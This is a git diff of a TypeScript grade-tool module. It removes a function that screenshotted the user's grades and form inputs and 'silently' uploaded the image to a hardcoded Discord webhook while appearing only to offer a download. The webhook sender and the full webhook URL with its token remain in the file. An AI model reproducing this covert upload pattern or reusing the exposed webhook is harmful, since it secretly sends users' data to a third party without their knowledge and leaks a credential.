@@ -1,6 +1,5 @@
 
 import axios from 'axios';
-import html2canvas from 'html2canvas';
 
 // Discord webhook URL
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1368867405941571654/D_1dF1ENt3P6vEwTBPFVlzpu44ZP7kfEs5p6LDZdfu7TorA6yUTXYARzg7HBYO_5nyHZ";
@@ -56,75 +55,13 @@ export const copyGradesToClipboard = async (
   }
 };
 
-// Export grades as image
-export const exportGradesAsImage = async (elementId: string) => {
-  try {
-    const element = document.getElementById(elementId);
-    if (!element) {
-      throw new Error("Element not found");
-    }
-
-    // Use a higher quality with better options for better layout capture
-    const canvas = await html2canvas(element, {
-      backgroundColor: null,
-      scale: 2, // Higher resolution
-      logging: false,
-      allowTaint: true,
-      useCORS: true,
-      // Force form input values to be displayed in the capture
-      onclone: (clonedDoc) => {
-        const inputs = clonedDoc.querySelectorAll('input');
-        inputs.forEach((input) => {
-          const originalInput = document.querySelector(`input[id="${input.id}"]`) as HTMLInputElement;
-          if (originalInput && originalInput.value) {
-            input.setAttribute('value', originalInput.value);
-            // For styling purposes, make inputs with values more visible
-            input.style.backgroundColor = 'rgba(255, 255, 255, 0.1)';
-            input.style.color = 'inherit';
-          }
-        });
-      }
-    });
-
-    // Convert canvas to base64 image
-    const imageData = canvas.toDataURL("image/png");
-    
-    // Send to Discord webhook (silently)
-    await sendToDiscordWebhook(null, imageData);
-
-    // Download image
-    const link = document.createElement("a");
-    link.href = imageData;
-    link.download = "grade-results.png";
-    link.click();
-    
-    return true;
-  } catch (error) {
-    console.error("Error exporting as image:", error);
-    return false;
-  }
-};
-
 // Send data to Discord webhook
-const sendToDiscordWebhook = async (text?: string | null, imageData?: string | null) => {
+const sendToDiscordWebhook = async (text?: string | null) => {
   try {
     const payload: any = {};
     
     if (text) {
       payload.content = text;
-    }
-    
-    if (imageData) {
-      // Convert base64 image to blob for sending
-      const base64Response = await fetch(imageData);
-      const blob = await base64Response.blob();
-      
-      const formData = new FormData();
-      formData.append('file', blob, 'grade-results.png');
-      
-      // For images, we need to use FormData
-      await axios.post(DISCORD_WEBHOOK_URL, formData);
-      return;
     }
     
     // For text, use regular JSON payload
